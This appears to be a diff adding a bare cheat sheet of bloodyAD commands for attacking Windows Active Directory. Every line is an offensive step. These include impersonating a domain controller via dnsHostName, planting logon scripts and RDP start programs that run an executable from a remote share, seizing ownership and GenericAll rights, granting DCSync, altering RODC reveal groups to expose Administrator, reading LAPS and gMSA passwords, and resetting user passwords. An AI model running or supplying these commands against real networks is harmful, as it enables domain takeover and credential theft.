@@ -1,0 +1,16 @@
+bloodyAD -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --host "$DC_IP" set object "$COMPUTER_NAME" serviceprincipalname
+bloodyAD -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --host "$DC_IP" set object "$COMPUTER_NAME" dnsHostName -v "$DC_NAME.$DOMAIN"
+bloodyAD -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --host "$DC_IP" get object "$COMPUTER_NAME" --attr dnsHostName,serviceprincipalname
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET_USER" msTSInitialProgram -v '\\1.2.3.4\share\file.exe'
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET_USER" msTSWorkDirectory -v 'C:\'
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET_USER" scriptPath -v '\\1.2.3.4\share\file.exe'
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set owner "$TARGET_OBJECT" "$CONTROLLED_PRINCIPAL"
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get dnsDump
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember "$TARGET_GROUP" "$TARGET_USER"
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object 'RODC-server$' --attr msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local' -v 'CN=Administrator,CN=Users,DC=domain,DC=local'
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object 'RODC-server$' --attr msDS-NeverRevealGroup
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password "$TARGET_USER" "$NEW_PASSWORD"
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add genericAll "$TARGET_OBJECT" "$CONTROLLED_PRINCIPAL"
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add dcsync "$CONTROLLED_PRINCIPAL"
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get object "$TARGET_OBJECT" --attr msDS-ManagedPassword
